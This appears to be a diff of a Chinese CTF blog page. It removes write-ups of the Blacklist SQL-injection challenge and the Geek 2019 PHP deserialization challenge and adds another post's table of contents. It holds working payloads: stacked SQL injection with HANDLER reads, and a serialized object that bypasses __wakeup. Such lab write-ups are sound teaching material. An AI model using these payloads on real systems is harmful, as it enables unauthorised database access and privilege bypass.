-        <h1 id="十九、-GYCTF2020-Blacklist-1"   >
-          <a href="#十九、-GYCTF2020-Blacklist-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十九、-GYCTF2020-Blacklist-1" class="headerlink" title="十九、[GYCTF2020]Blacklist 1"></a>十九、[GYCTF2020]Blacklist 1</h1>
-      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041951047.png" alt="image-20240104195127003"></p>
-<p>和之前的  四、[强网杯 2019]随便注 1 很相似，但是只能利用open和handler</p>
-<p>输入select</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041955252.png" alt="image-20240104195558198"></p>
-<p>可以看到之前用的 修改表名 和 预处理 所需的关键字都被过滤了</p>
-<p>查询一下表</p>
-<p><code>&#39;;show tables#</code></p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401042000563.png" alt="image-20240104200022523"></p>
-<p>直接查询“FlagHere”表的结构</p>
-<p><code>&#39;;show columns from FlagHere#</code></p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401042001914.png" alt="image-20240104200132875"></p>
-<p>于是可以构造payload</p>
-<p><code>&#39;;handler</code>FlagHere<code>open as a;handler a read next;#</code></p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041958103.png" alt="image-20240104195836055"></p>
-<p>获得flag</p>
-
-        <h1 id="二十、-极客大挑战-2019-PHP-1"   >
-          <a href="#二十、-极客大挑战-2019-PHP-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十、-极客大挑战-2019-PHP-1" class="headerlink" title="二十、[极客大挑战 2019]PHP 1"></a>二十、[极客大挑战 2019]PHP 1</h1>
-      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401051629835.png" alt="image-20240105162914690"></p>
-<p>提示了我们备份，可以直接下载一下<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.zip/" >www.zip</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p>输入</p>
-<p><code>/www.zip</code></p>
-<p>回车即开始下载</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401051631055.png" alt="image-20240105163130011"></p>
-<p>可以看到有三个php文件，分别打开来看</p>
-<p>flag.php：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag = &#x27;Syc&#123;dog_dog_dog_dog&#125;&#x27;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
-
-<p>index.php:</p>
-<p>重点在</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">include &#x27;class.php&#x27;;</span><br><span class="line"></span><br><span class="line"> $select = $_GET[&#x27;select&#x27;];</span><br><span class="line"></span><br><span class="line"> $res=unserialize(@$select);</span><br></pre></td></tr></table></div></figure>
-
-<p>解读一下，用GET方法传入参数select，后面也提示了用反序列化</p>
-<p>class.php:</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username = &#x27;guest&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password != 100) &#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username === &#x27;admin&#x27;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
-
-<p>即当参数username=’admin’和password=100时才会有flag，编写代码进行序列化</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    //省略部分函数</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Name(&#x27;admin&#x27;,100); </span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
-
-<p>运行后得到</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401051641173.png" alt="image-20240105164108131"></p>
-<p>由于private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度</p>
-<p>但是在class.php中多了一个wakeup()函数</p>
-<p>绕过_wakeup函数的方法：<em>当成员属性数目大于实际数目时可绕过wakeup方法</em></p>
-<p>所以需要把成员数目的2变成大于2的数字，例如4，即输入</p>
-<p><code>/?select=O:4:&quot;Name&quot;:4:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></p>
-<p>回车</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401051654105.png" alt="image-20240105165440045"></p>
-<p>得到flag</p>
-</div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">3</div><div class="sidebar-ov-state-item__name">Archives</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>John Doe</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v6.0.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://example.com">John Doe</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://example.com/2023/01/09/NSSCTF%20WEB/">http://example.com/2023/01/09/NSSCTF%20WEB/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2022/01/06/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"><span class="paginator-prev__text">PHP环境搭建</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-jicao"><span class="toc-number">1.</span> <span class="toc-text">
+          一、[SWPUCTF 2021 新生赛]jicao</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E2%85%A0%EF%BC%9AHackBar"><span class="toc-number">1.1.</span> <span class="toc-text">
+          法Ⅰ：HackBar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E2%85%A1%EF%BC%9ABurpsuite"><span class="toc-number">1.2.</span> <span class="toc-text">
+          法Ⅱ：Burpsuite</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-Do-you-know-http"><span class="toc-number">2.</span> <span class="toc-text">
+          二、[SWPUCTF 2021 新生赛]Do_you_know_http</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%99%84%E4%B8%8A%E5%B8%B8%E8%A7%81%E8%AF%B7%E6%B1%82%E6%8A%A5%E6%96%87%E7%9A%84%E4%BB%A3%E8%A1%A8%E5%90%AB%E4%B9%89"><span class="toc-number">2.0.0.0.1.</span> <span class="toc-text">
+          附上常见请求报文的代表含义</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-gift-F12"><span class="toc-number">3.</span> <span class="toc-text">
+          三、[SWPUCTF 2021 新生赛]gift_F12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-WebFTP"><span class="toc-number">4.</span> <span class="toc-text">
+          四、[第五空间 2021]WebFTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easy-md5"><span class="toc-number">5.</span> <span class="toc-text">
+          五、[SWPUCTF 2021 新生赛]easy_md5</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#MD5%E7%BB%95%E8%BF%87%E6%9C%89%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95%EF%BC%9A%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%E5%92%8C%E7%A7%91%E5%AD%A6%E8%AE%A1%E6%95%B0%E6%B3%95%E7%BB%95%E8%BF%87"><span class="toc-number">5.0.0.0.1.</span> <span class="toc-text">
+          MD5绕过有两种方法：数组绕过和科学计数法绕过</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E2%85%A0%EF%BC%9A%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="toc-number">5.1.</span> <span class="toc-text">
+          法Ⅰ：数组绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E2%85%A1%EF%BC%9A%E7%A7%91%E5%AD%A6%E8%AE%A1%E6%95%B0%E6%B3%95%E7%BB%95%E8%BF%87"><span class="toc-number">5.2.</span> <span class="toc-text">
+          法Ⅱ：科学计数法绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%99%84%EF%BC%9AMD5%E7%BB%95%E8%BF%87"><span class="toc-number">5.2.0.0.1.</span> <span class="toc-text">
+          附：MD5绕过</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-include"><span class="toc-number">6.</span> <span class="toc-text">
+          六、[SWPUCTF 2021 新生赛]include</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%99%84%EF%BC%9A%E5%B8%B8%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE-celtyl"><span class="toc-number">6.0.0.0.1.</span> <span class="toc-text">
+          附：常用php伪协议 celtyl</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-PseudoProtocols"><span class="toc-number">7.</span> <span class="toc-text">
+          七、[SWPUCTF 2021 新生赛]PseudoProtocols</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81-NISACTF-2022-easyssrf"><span class="toc-number">8.</span> <span class="toc-text">
+          八、[NISACTF 2022]easyssrf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize"><span class="toc-number">9.</span> <span class="toc-text">
+          九、[SWPUCTF 2021 新生赛]ez_unserialize</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-number">9.0.0.0.1.</span> <span class="toc-text">
+          工具使用方法：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9C%A8%E8%AF%A5%E7%95%8C%E9%9D%A2%E5%8F%B3%E9%94%AE%E8%BF%9B%E5%85%A5%E7%BB%88%E7%AB%AF"><span class="toc-number">9.0.0.0.2.</span> <span class="toc-text">
+          在该界面右键进入终端</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%86%8D%E8%BE%93%E5%85%A5"><span class="toc-number">9.0.0.0.3.</span> <span class="toc-text">
+          再输入</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#python-dirsearch-py-u-%E5%BD%93%E5%89%8D%E7%9A%84URL"><span class="toc-number">9.0.0.0.4.</span> <span class="toc-text">
+          python .\dirsearch.py -u +当前的URL</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%99%84%EF%BC%9ACTF%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">9.0.0.0.5.</span> <span class="toc-text">
+          附：CTF中的序列化与反序列化</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E3%80%81-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup"><span class="toc-number">10.</span> <span class="toc-text">
+          十、[SWPUCTF 2021 新生赛]no_wakeup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%BA%94%E3%80%81-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easyupload1-0"><span class="toc-number">11.</span> <span class="toc-text">
+          十五、[SWPUCTF 2021 新生赛]easyupload1.0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E5%85%AB%E3%80%81-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-caidao"><span class="toc-number">12.</span> <span class="toc-text">
+          十八、[SWPUCTF 2021 新生赛]caidao</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B9%9D%E3%80%81-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easyrce"><span class="toc-number">13.</span> <span class="toc-text">
+          十九、[SWPUCTF 2021 新生赛]easyrce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E5%8D%81%E3%80%81-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easyupload3-0"><span class="toc-number">14.</span> <span class="toc-text">
+          二十、[SWPUCTF 2021 新生赛]easyupload3.0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E5%8D%81%E4%B8%80%E3%80%81-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-babyrce"><span class="toc-number">15.</span> <span class="toc-text">
+          二十一、[SWPUCTF 2021 新生赛]babyrce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E5%8D%81%E4%BA%8C%E3%80%81-LitCTF-2023-%E6%88%91Flag%E5%91%A2%EF%BC%9F"><span class="toc-number">16.</span> <span class="toc-text">
+          二十二、[LitCTF 2023]我Flag呢？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E5%8D%81%E4%B8%89%E3%80%81-LitCTF-2023-PHP%E6%98%AF%E4%B8%96%E7%95%8C%E4%B8%8A%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80%EF%BC%81%EF%BC%81"><span class="toc-number">17.</span> <span class="toc-text">
+          二十三、[LitCTF 2023]PHP是世界上最好的语言！！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E5%8D%81%E5%9B%9B%E3%80%81-ZJCTF-2019-NiZhuanSiWei"><span class="toc-number">18.</span> <span class="toc-text">
+          二十四、[ZJCTF 2019]NiZhuanSiWei</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%8B%A5%E5%B0%86%E4%B8%80%E4%B8%AA%E5%BA%8F%E5%88%97%E5%8C%96%E5%90%8E%E7%9A%84%E5%AF%B9%E8%B1%A1%E5%8D%B3%E4%B8%80%E4%B8%B2%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BC%A0%E7%BB%99-password%EF%BC%8C%E9%82%A3%E4%B9%88%E6%88%91%E4%BB%AC%E4%BC%9A%E5%BE%97%E5%88%B0%E4%B8%80%E4%B8%AA%E5%AE%9E%E4%BE%8B%E5%AF%B9%E8%B1%A1%EF%BC%8C%E8%8B%A5%E6%98%AF%E6%88%91%E4%BB%AC%E5%B0%86%E4%B8%80%E4%B8%AAuseless-php%E4%B8%AD%E7%9A%84Flag%E5%AF%B9%E8%B1%A1-%E5%85%B6%E4%B8%AD-file%E5%8F%82%E6%95%B0%E7%9A%84%E5%80%BC%E4%B8%BAflag-php-%E5%BA%8F%E5%88%97%E5%8C%96%E5%90%8E%E5%BE%97%E5%88%B0%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BC%A0%E7%BB%99-password%E5%8F%82%E6%95%B0%EF%BC%8C%E7%BB%8F%E8%BF%87%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%90%8E%E5%8F%98%E5%8F%98%E6%88%90%E4%BA%86%E4%B8%80%E4%B8%AA%E5%AE%9E%E4%BE%8B%E5%AF%B9%E8%B1%A1%EF%BC%8C%E4%B8%80%E5%8F%A5%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%9A%84%E4%BB%A3%E7%A0%81-%E4%B8%94%E8%83%BD%E8%BE%93%E5%87%BAflag-php%E4%B8%AD%E7%9A%84%E4%BB%A3%E7%A0%81"><span class="toc-number">18.0.0.0.1.</span> <span class="toc-text">
+          若将一个序列化后的对象即一串字符串传给$password，那么我们会得到一个实例对象，若是我们将一个useless.php中的Flag对象(其中$file参数的值为flag.php)序列化后得到的字符串传给$password参数，经过反序列化后变变成了一个实例对象，一句可执行的代码,且能输出flag.php中的代码</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E5%8D%81%E4%BA%94%E3%80%81-BJDCTF-2020-easy-md5"><span class="toc-number">19.</span> <span class="toc-text">
+          二十五、[BJDCTF 2020]easy_md5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E5%8D%81%E5%85%AD%E3%80%81-LitCTF-2023-%E5%AF%BC%E5%BC%B9%E8%BF%B7%E8%B8%AA"><span class="toc-number">20.</span> <span class="toc-text">
+          二十六、[LitCTF 2023]导弹迷踪</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E5%8D%81%E4%B8%83%E3%80%81-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-hardrce"><span class="toc-number">21.</span> <span class="toc-text">
+          二十七、[SWPUCTF 2021 新生赛]hardrce</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#url%E7%BC%96%E7%A0%81%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87-%EF%BC%9A%E5%B0%B1%E6%98%AF%E6%88%91%E4%BB%AC%E5%B0%86php%E4%BB%A3%E7%A0%81url%E7%BC%96%E7%A0%81%E5%90%8E%E5%8F%96%E5%8F%8D%EF%BC%8C%E6%88%91%E4%BB%AC%E4%BC%A0%E5%85%A5%E5%8F%82%E6%95%B0%E5%90%8E%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%BF%9B%E8%A1%8Curl%E8%A7%A3%E7%A0%81%EF%BC%8C%E8%BF%99%E6%97%B6%E7%94%B1%E4%BA%8E%E5%8F%96%E5%8F%8D%E5%90%8E%EF%BC%8C%E4%BC%9Aurl%E8%A7%A3%E7%A0%81%E6%88%90%E4%B8%8D%E5%8F%AF%E6%89%93%E5%8D%B0%E5%AD%97%E7%AC%A6%EF%BC%8C%E8%BF%99%E6%A0%B7%E6%88%91%E4%BB%AC%E5%B0%B1%E4%BC%9A%E7%BB%95%E8%BF%87"><span class="toc-number">21.0.0.0.1.</span> <span class="toc-text">
+          url编码取反绕过 ：就是我们将php代码url编码后取反，我们传入参数后服务端进行url解码，这时由于取反后，会url解码成不可打印字符，这样我们就会绕过</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E6%9D%A5%E6%BA%90%EF%BC%9Ahttps-www-cnblogs-com-EddieMurphy-blogs-p-17747410-html"><span class="toc-number">21.0.0.1.</span> <span class="toc-text">
+          思路来源：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;EddieMurphy-blogs&#x2F;p&#x2F;17747410.html</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E5%8D%81%E5%85%AB%E3%80%81-NSSCTF-2022-Spring-Recruit-ezgame"><span class="toc-number">22.</span> <span class="toc-text">
+          二十八、[NSSCTF 2022 Spring Recruit]ezgame</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E5%8D%81%E4%B9%9D%E3%80%81-GXYCTF-2019-Ping-Ping-Ping"><span class="toc-number">23.</span> <span class="toc-text">
+          二十九、[GXYCTF 2019]Ping Ping Ping</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%EF%BC%88PS-%E7%94%A8%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C%E8%BF%98%E8%83%BD%E7%9C%8B%E5%88%B0%E8%BF%87%E6%BB%A4%E4%BA%86%E5%93%AA%E4%BA%9B%E5%86%85%E5%AE%B9%EF%BC%89"><span class="toc-number">23.0.0.0.1.</span> <span class="toc-text">
+          （PS:用内联执行还能看到过滤了哪些内容）</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E5%8D%81%E3%80%81-LitCTF-2023-Follow-me-and-hack-me"><span class="toc-number">24.</span> <span class="toc-text">
+          三十、[LitCTF 2023]Follow me and hack me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E5%8D%81%E4%B8%80%E3%80%81-LitCTF-2023-Ping"><span class="toc-number">25.</span> <span class="toc-text">
+          三十一、[LitCTF 2023]Ping</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E2%85%A0%EF%BC%9APOST%E4%BC%A0%E5%8F%82"><span class="toc-number">25.1.</span> <span class="toc-text">
+          法Ⅰ：POST传参</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E2%85%A1%EF%BC%9A%E5%85%B3%E9%97%ADJavaScript"><span class="toc-number">25.2.</span> <span class="toc-text">
+          法Ⅱ：关闭JavaScript</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E5%8D%81%E4%BA%8C%E3%80%81-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-finalrce"><span class="toc-number">26.</span> <span class="toc-text">
+          三十二、[SWPUCTF 2021 新生赛]finalrce</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%94%A8tee%E5%91%BD%E4%BB%A4%EF%BC%9ALinux-tee%E5%91%BD%E4%BB%A4%E7%94%A8%E4%BA%8E%E8%AF%BB%E5%8F%96%E6%A0%87%E5%87%86%E8%BE%93%E5%85%A5%E7%9A%84%E6%95%B0%E6%8D%AE%EF%BC%8C%E5%B9%B6%E5%B0%86%E5%85%B6%E5%86%85%E5%AE%B9%E8%BE%93%E5%87%BA%E6%88%90%E6%96%87%E4%BB%B6%E3%80%82"><span class="toc-number">26.0.0.0.1.</span> <span class="toc-text">
+          用tee命令：Linux tee命令用于读取标准输入的数据，并将其内容输出成文件。</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84%E4%B8%BA%EF%BC%9Acommand-tee-file-txt"><span class="toc-number">26.0.0.0.2.</span> <span class="toc-text">
